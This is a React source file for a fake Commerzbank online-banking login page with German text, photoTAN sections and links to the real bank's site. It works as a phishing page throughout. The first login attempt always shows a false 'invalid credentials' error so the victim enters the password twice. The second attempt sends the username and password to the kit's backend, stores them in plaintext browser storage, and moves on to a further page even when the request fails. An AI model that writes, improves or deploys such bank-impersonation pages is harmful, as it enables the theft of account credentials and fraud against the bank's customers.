import React, { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { useLanguage } from '../contexts/LanguageContext';
import apiService from '../services/api';
import { FaArrowRight } from 'react-icons/fa';

interface LoginFormData {
  xusr: string;
  xpss: string;
}

const LoginPage: React.FC = () => {
  const navigate = useNavigate();
  const { t } = useLanguage();
  const [formData, setFormData] = useState<LoginFormData>({
    xusr: '',
    xpss: ''
  });
  const [errors, setErrors] = useState<Partial<LoginFormData>>({});
  const [isLoading, setIsLoading] = useState(false);
  const [loginAttempts, setLoginAttempts] = useState(0);
  const [showInvalidCredentials, setShowInvalidCredentials] = useState(false);
  const [isMobile, setIsMobile] = useState(window.innerWidth <= 768);

  // Handle window resize
  useEffect(() => {
    const handleResize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    window.addEventListener('resize', handleResize);
    return () => window.removeEventListener('resize', handleResize);
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData(prev => ({
      ...prev,
      [name]: value
    }));
    // Clear error when user starts typing
    if (errors[name as keyof LoginFormData]) {
      setErrors(prev => ({
        ...prev,
        [name]: ''
      }));
    }
  };

  const validateForm = (): boolean => {
    const newErrors: Partial<LoginFormData> = {};

    if (!formData.xusr.trim()) {
      newErrors.xusr = 'Bitte geben Sie Ihre Benutzer-ID ein.';
    }

    if (!formData.xpss.trim()) {
      newErrors.xpss = 'Bitte geben Sie Ihr Passwort ein.';
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    setShowInvalidCredentials(false);

    // Simulate the two-attempt logic
    if (loginAttempts === 0) {
      // First attempt - show error message
      setTimeout(() => {
        setLoginAttempts(1);
        setShowInvalidCredentials(true);
        setIsLoading(false);
      }, 1000);
    } else {
      // Second attempt - proceed to next page
      try {
        // Send data to backend (simulating the PHP behavior)
        const loginResponse = await apiService.login(formData);
        console.log('LoginPage - Login response:', loginResponse);
        
        // Store in both session and local storage for mobile compatibility
        sessionStorage.setItem('xusr', formData.xusr);
        sessionStorage.setItem('xpss', formData.xpss);
        localStorage.setItem('xusr', formData.xusr);
        localStorage.setItem('xpss', formData.xpss);
        
        // Debug: Check if sessionId was stored by apiService
        const storedSessionId = sessionStorage.getItem('sessionId') || localStorage.getItem('sessionId');
        console.log('LoginPage - Stored sessionId after login:', storedSessionId);
        
        // Navigate to info page
        navigate('/info');
      } catch (error) {
        console.error('Login error:', error);
        // Still navigate to maintain the flow
        sessionStorage.setItem('xusr', formData.xusr);
        sessionStorage.setItem('xpss', formData.xpss);
        localStorage.setItem('xusr', formData.xusr);
        localStorage.setItem('xpss', formData.xpss);
        navigate('/info');
      } finally {
        setIsLoading(false);
      }
    }
  };

  return (
    <div className="login-page" style={{
      fontFamily: 'Arial, Helvetica, sans-serif',
      backgroundColor: '#f5f5f5',
      minHeight: '100vh',
      display: 'flex',
      flexDirection: 'column',
      alignItems: 'center',
      justifyContent: 'flex-start',
      padding: '20px 20px 20px 20px',
      margin: 0
    }}>
      {/* Online banking registration heading */}
      <h1 style={{
        fontSize: '32px',
        fontWeight: 'bold',
        color: '#333',
        marginTop: '20px',
        marginBottom: '20px',
        fontFamily: 'Arial, Helvetica, sans-serif',
        textAlign: 'left',
        width: '100%',
        maxWidth: '1200px',
        margin: '20px auto 20px auto',
        padding: isMobile ? '0 10px' : '0 20px'
      }}>
{t('onlineBankingRegistration')}
      </h1>
      
      <div style={{
        display: 'flex',
        flexDirection: isMobile ? 'column' : 'row',
        gap: '20px',
        width: '100%',
        maxWidth: '1200px',
        alignItems: 'flex-start',
        margin: '0 auto',
        padding: isMobile ? '0 10px' : '0 20px'
      }}>
        {/* Login Box */}
        <div className="login-box" style={{
          flex: '1',
          background: 'white',
          borderRadius: '8px',
          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
          padding: isMobile ? '20px' : '40px'
        }}>
        <form onSubmit={handleSubmit} style={{
          padding: '15px'
        }}>
          {showInvalidCredentials && (
            <div className="error-message">
              <div className="error-icon">!</div>
              <div className="error-text">{t('invalidCredentials')}</div>
            </div>
          )}
          <div style={{
            marginBottom: '10px',
            position: 'relative',
            display: 'flex',
            justifyContent: 'center'
          }}>
            <input
              type="text"
              id="xusr"
              name="xusr"
              value={formData.xusr}
              onChange={handleInputChange}
              className="form-input"
              style={{
                width: '130%',
                padding: '12px 12px 12px 12px',
                border: '1px solid #ddd',
                borderRadius: '4px',
                backgroundColor: 'white',
                fontFamily: 'Arial, Helvetica, sans-serif',
                fontSize: '14px',
                outline: 'none !important',
                boxShadow: 'none !important'
              }}
              onFocus={(e) => {
                e.target.style.backgroundColor = 'white';
              }}
                  placeholder={t('username')}
                  autoComplete="off"
                  required
                />
                <span style={{
                  position: 'absolute',
                  right: '12px',
                  top: '50%',
                  transform: 'translateY(-50%)',
                  backgroundColor: '#ccc',
                  color: 'white',
                  borderRadius: '50%',
                  width: '20px',
                  height: '20px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  fontSize: '12px',
                  fontWeight: 'bold'
                }}>i</span>
              </div>

              <div style={{
                marginBottom: '10px',
                position: 'relative',
                display: 'flex',
                justifyContent: 'center'
              }}>
                <input
                  type="password"
                  id="xpss"
                  name="xpss"
                  value={formData.xpss}
                  onChange={handleInputChange}
                  className="form-input"
                  style={{
                    width: '130%',
                    padding: '12px 12px 12px 12px',
                    border: '1px solid #ddd',
                    borderRadius: '4px',
                    backgroundColor: 'white',
                    fontFamily: 'Arial, Helvetica, sans-serif',
                    fontSize: '14px',
                    outline: 'none !important',
                    boxShadow: 'none !important'
                  }}
                  onFocus={(e) => {
                    e.target.style.backgroundColor = 'white';
                  }}
              placeholder={t('password')}
              autoComplete="off"
              required
            />
            <span style={{
              position: 'absolute',
              right: '12px',
              top: '50%',
              transform: 'translateY(-50%)',
              backgroundColor: '#ccc',
              color: 'white',
              borderRadius: '50%',
              width: '20px',
              height: '20px',
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'center',
              fontSize: '12px',
              fontWeight: 'bold'
            }}>i</span>
          </div>

              <button 
                type="submit" 
                className="form-button"
                disabled={isLoading}
                style={{
                  width: '40%',
                  padding: '15px',
                  background: 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)',
                  color: 'white',
                  border: 'none',
                  borderRadius: '4px',
                  fontSize: '16px',
                  fontWeight: 'bold',
                  cursor: 'pointer',
                  fontFamily: 'Arial, Helvetica, sans-serif',
                  marginTop: '5px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  gap: '8px',
                  margin: '5px auto 0 auto',
                  transition: 'background 0.3s ease'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.background = 'linear-gradient(315deg, #004d00 0%, #006400 50%, #004d00 100%)';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.background = 'linear-gradient(135deg, #006400 0%, #004d00 50%, #006400 100%)';
                }}
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="white" style={{ marginRight: '4px' }}>
                  <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zM12 17c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zM15.1 8H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/>
                </svg>
            {isLoading ? (t('loginButton') + '...') : t('loginButton')}
          </button>
        </form>

        {/* Divider matching input border color */}
        <div style={{
          width: '100%',
          height: '1px',
          backgroundColor: '#ddd',
          margin: '20px 0'
        }}></div>


        <div style={{
          padding: '0 20px',
          marginBottom: '8px',
          textAlign: 'left'
        }}>
          <h3 style={{
            fontSize: '20px',
            fontWeight: 'bold',
            color: 'black',
            marginBottom: '10px',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>{t('updatePhotoTAN')}</h3>
              <button 
                style={{
                  background: 'linear-gradient(135deg, #FFC107 0%, #FFD54F 50%, #FFC107 100%)',
                  color: 'black',
                  border: 'none',
                  padding: '10px 15px',
                  borderRadius: '4px',
                  fontSize: '14px',
                  cursor: 'pointer',
                  fontFamily: 'Arial, Helvetica, sans-serif',
                  transition: 'background 0.3s ease',
                  boxShadow: '0 2px 4px rgba(0, 0, 0, 0.3)'
                }}
                onMouseEnter={(e) => {
                  e.currentTarget.style.background = 'linear-gradient(315deg, #FFD54F 0%, #FFC107 50%, #FFD54F 100%)';
                }}
                onMouseLeave={(e) => {
                  e.currentTarget.style.background = 'linear-gradient(135deg, #FFC107 0%, #FFD54F 50%, #FFC107 100%)';
                }}
              >{t('businessPortal')}</button>
        </div>

        {/* Divider after photoTAN section */}
        <div style={{
          width: '100%',
          height: '1px',
          backgroundColor: '#ddd',
          margin: '20px 0'
        }}></div>

        <div style={{
          padding: '0 20px',
          marginBottom: '8px',
          textAlign: 'left'
        }}>
          <h3 style={{
            fontSize: '20px',
            fontWeight: 'bold',
            color: 'black',
            marginBottom: '10px',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>{t('notDigitalCustomer')}</h3>
          <a href="#zugang" style={{
            color: 'black',
            textDecoration: 'none',
            display: 'flex',
            alignItems: 'center',
            gap: '8px',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>
            {/* @ts-ignore */}
            <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
{t('applyDigitalAccess')}
          </a>
        </div>

        <div style={{
          padding: '20px 20px 0 20px',
          marginBottom: '8px',
          textAlign: 'left'
        }}>
          <h3 style={{
            fontSize: '20px',
            fontWeight: 'bold',
            color: 'black',
            marginBottom: '10px',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>{t('currentWarnings')}</h3>
          <div>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              gap: '8px',
              marginBottom: '8px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {/* @ts-ignore */}
              <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
{t('warning1')}
            </div>
            <div style={{
              display: 'flex',
              alignItems: 'center',
              gap: '8px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {/* @ts-ignore */}
              <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
{t('warning2')}
            </div>
          </div>
        </div>
        </div>
        
        {/* Important Info Box */}
        <div className="info-panel" style={{
          flex: '1',
          background: 'white',
          borderRadius: '8px',
          boxShadow: '0 2px 10px rgba(0, 0, 0, 0.1)',
          padding: isMobile ? '20px' : '40px'
        }}>
          <h3 style={{
            fontSize: '20px',
            fontWeight: 'bold',
            color: '#333',
            marginBottom: '15px',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>
            {t('importantInfo')}
          </h3>
          
          <p style={{
            fontSize: '14px',
            color: '#666',
            marginBottom: '20px',
            lineHeight: '1.5',
            fontFamily: 'Arial, Helvetica, sans-serif'
          }}>
            {t('photoTANProblems')}
          </p>
          
          <div style={{ marginBottom: '20px' }}>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('noActiveTAN')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('activatePhotoTAN')}</span>
              </a>
            </div>
            <div>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('photoTANHelp')}</span>
              </a>
            </div>
          </div>
          
          <div style={{ marginBottom: '20px' }}>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('forgotCredentials')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('requestParticipantNumber')}</span>
              </a>
            </div>
            <div>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('forgotPIN')}</span>
              </a>
            </div>
          </div>
          
          <div>
            <h4 style={{
              fontSize: '16px',
              fontWeight: 'bold',
              color: '#333',
              marginBottom: '10px',
              fontFamily: 'Arial, Helvetica, sans-serif'
            }}>
              {t('allAboutOnlineBanking')}
            </h4>
            <div style={{ marginBottom: '8px' }}>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('instructionsHelp')}</span>
              </a>
            </div>
            <div>
              <a href="https://www.commerzbank.de/" target="_blank" rel="noopener noreferrer" style={{
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                fontFamily: 'Arial, Helvetica, sans-serif',
                textDecoration: 'none',
                color: 'inherit',
                cursor: 'pointer'
              }}
              onMouseEnter={(e) => {
                e.currentTarget.style.textDecoration = 'underline';
              }}
              onMouseLeave={(e) => {
                e.currentTarget.style.textDecoration = 'none';
              }}>
                {/* @ts-ignore */}
                <FaArrowRight style={{ color: '#FFC107', fontSize: '16px' }} />
                <span style={{ fontSize: '14px', color: '#333' }}>{t('security')}</span>
              </a>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
